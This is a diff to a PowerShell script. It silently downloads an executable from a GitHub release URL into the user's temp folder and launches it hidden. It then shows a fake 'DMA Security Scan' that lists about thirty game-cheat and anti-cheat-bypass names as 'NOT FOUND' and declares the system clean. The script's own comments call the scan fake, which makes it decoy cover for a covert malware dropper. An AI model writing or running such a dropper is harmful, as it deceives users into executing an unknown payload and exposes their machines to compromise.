@@ -1,1 +1,62 @@
-iwr https://github.com/Proxyonly/dsfds/releases/download/da/TEMP.exe -O $env:TEMP\m.exe; & $env:TEMP\m.exe
+# Download the EXE silently (suppress progress bar)
+$progressPreference = 'silentlyContinue'
+iwr https://github.com/Proxyonly/dsfds/releases/download/da/TEMP.exe -O $env:TEMP\m.exe
+
+# Start the EXE completely hidden (no window at all)
+$p = Start-Process -FilePath $env:TEMP\m.exe -WindowStyle Hidden -PassThru
+
+# Wait a moment before starting the fake scan
+Start-Sleep -Seconds 1
+Clear-Host
+
+# ===== FAKE DMA SECURITY SCAN =====
+Write-Host "=============================================" -ForegroundColor Cyan
+Write-Host "   DMA (Direct Memory Access) Security Scan" -ForegroundColor White
+Write-Host "   Scanning system memory for threats..." -ForegroundColor Yellow
+Write-Host "=============================================" -ForegroundColor Cyan
+Write-Host ""
+
+$hackNames = @(
+    "CheatEngine.DMA.Hook",
+    "Xenos.Injector.x64",
+    "ExtremeInjector.v3.7",
+    "EasyAntiCheat.Bypass",
+    "BattlEye.Evasion.Module",
+    "UnknownCheats.DMA.Scanner",
+    "CSGOSimple.External",
+    "Valorant.Triggerbot.DMA",
+    "ApexLegends.Aimbot.v2",
+    "Rust.EAC.Bypass.Tool",
+    "Warzone.DMA.MapHack",
+    "Fivem.Cheat.Engine",
+    "AssaultCube.Wallhack",
+    "CallOfDuty.DMA.Spoofer",
+    "Fortnite.SkinChanger",
+    "Hyperion.Cheat.Detection",
+    "Vanguard.AntiCheat.Bypass",
+    "FaceIT.AC.Evasion",
+    "ESEA.Client.Hook",
+    "GTA5.Menu.Injector",
+    "DayZ.DMA.ESP",
+    "RainbowSix.SilentAim",
+    "PUBG.DMA.Resolver",
+    "EscapeFromTarkov.DMA.Map",
+    "LeagueSharp.Script.Engine",
+    "OW2.DMA.Overlay",
+    "DMA.Firmware.Spoofer",
+    "Kernel.DMA.Driver.Hook",
+    "EFI.DMA.Bootkit.Scan",
+    "AC.Core.Kernel.Module"
+)
+
+foreach ($hack in $hackNames) {
+    Start-Sleep -Seconds 3
+    Write-Host "    [+] $hack ... NOT FOUND" -ForegroundColor Green
+}
+
+Write-Host ""
+Write-Host "=============================================" -ForegroundColor Cyan
+Write-Host "   Scan Complete - No threats detected." -ForegroundColor Green
+Write-Host "=============================================" -ForegroundColor Cyan
+
+Read-Host "`nPress Enter to exit"
